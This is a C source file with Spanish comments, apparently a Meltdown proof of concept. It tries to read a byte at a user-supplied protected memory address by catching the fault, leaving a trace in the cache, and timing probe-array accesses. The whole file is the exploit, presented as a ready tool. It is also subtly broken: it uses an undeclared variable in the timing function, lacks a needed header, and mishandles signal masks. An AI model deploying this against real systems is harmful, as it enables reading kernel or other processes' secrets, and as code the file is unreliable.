#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <x86intrin.h>
#include <unistd.h>

#define PROBE_SIZE 256 * 4096
#define CACHE_HIT_THRESHOLD 80

uint8_t probe_array[PROBE_SIZE];
jmp_buf buf;

// Manejador de fallos por acceso ilegal
void handler(int sig) {
    longjmp(buf, 1);
}

// Para vaciar la caché
void flush_cache() {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
}

// Mide el tiempo de acceso a una dirección
uint64_t time_access(volatile uint8_t *addr) {
    uint64_t start, end;
    start = __rdtscp(&sig);
    (void)*addr;
    end = __rdtscp(&sig);
    return end - start;
}

// Ataque meltdown para leer un byte de memoria protegida
uint8_t leak_byte(uint8_t *secret) {
    // Limpia la caché antes de intentar leer
    flush_cache();

    // Intenta leer la dirección
    if (setjmp(buf) == 0) {
        // Esto lanzará una excepción
        uint8_t val = *secret;

        // Accede a la posición correspondiente en el array
        probe_array[val * 4096] += 1;
    }

    // Medir tiempos de acceso para ver qué valor quedó en caché
    for (int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255; // Mezclar el orden
        uint64_t t = time_access(&probe_array[mix_i * 4096]);

        if (t < CACHE_HIT_THRESHOLD) {
            return (uint8_t)mix_i;
        }
    }

    return 0;
}

int main(int argc, char *argv[]) {
    signal(SIGSEGV, handler);

    if (argc != 2) {
        printf("Uso: %s <direccion_en_hex>\n", argv[0]);
        return 1;
    }

    uint8_t *addr = (uint8_t *)strtoull(argv[1], NULL, 16);

    printf("Leyendo byte de %p...\n", addr);
    uint8_t result = leak_byte(addr);
    printf("Byte filtrado: 0x%02x (%c)\n", result, (result >= 32 && result <= 126) ? result : '.');

    return 0;
}
